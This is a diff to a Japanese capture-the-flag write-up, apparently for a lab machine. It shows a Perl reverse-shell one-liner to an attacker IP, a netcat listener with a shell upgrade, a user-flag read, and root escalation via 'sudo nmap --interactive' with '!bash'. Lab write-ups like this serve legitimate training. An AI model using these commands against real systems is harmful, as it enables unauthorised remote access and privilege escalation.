@@ -173,22 +173,32 @@ Data: perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.10.
 ```
 リーバスシェル取得、ユーザフラグゲット！
 ```sh
-└─$ rlwrap nc -lnvp 4444
+└─$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.11] from (UNKNOWN) [10.129.205.98] 59677
 
-id
-id
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+bash-3.2$ ^Z
+zsh: suspended  nc -lnvp 4444
+
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+                               export SHELL=bash
+
+bash-3.2$ export TERM=xterm-256color
+
+bash-3.2$ stty rows 66 columns 236
+
+bash-3.2$ id
 uid=100(asterisk) gid=101(asterisk)
 
-cat /home/fanis/user.txt
-cat /home/fanis/user.txt
+bash-3.2$ cat /home/fanis/user.txt
 2d69147c6496412b22133b3a0bd01a6e
 ```
 sudoでnmapをroot権限で実行できるので、ルートフラグゲット！
 ```sh
-sudo -l
-sudo -l
+bash-3.2$ sudo -l
 Matching Defaults entries for asterisk on this host:
     env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR
     LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE
@@ -211,22 +221,16 @@ User asterisk may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/hardware_detector
     (root) NOPASSWD: /sbin/chkconfig
 
-
-sudo nmap --interactive
-sudo nmap --interactive
-
+bash-3.2$ sudo nmap --interactive
 
 Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ )
 Welcome to Interactive Mode -- press h <enter> for help
 nmap> !bash
-      !bash
 
-id
-id
+bash-3.2# id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
 
-cat /root/root.txt
-cat /root/root.txt
+bash-3.2# cat /root/root.txt
 458340087499999a4af363208718ed2c
 ```
 
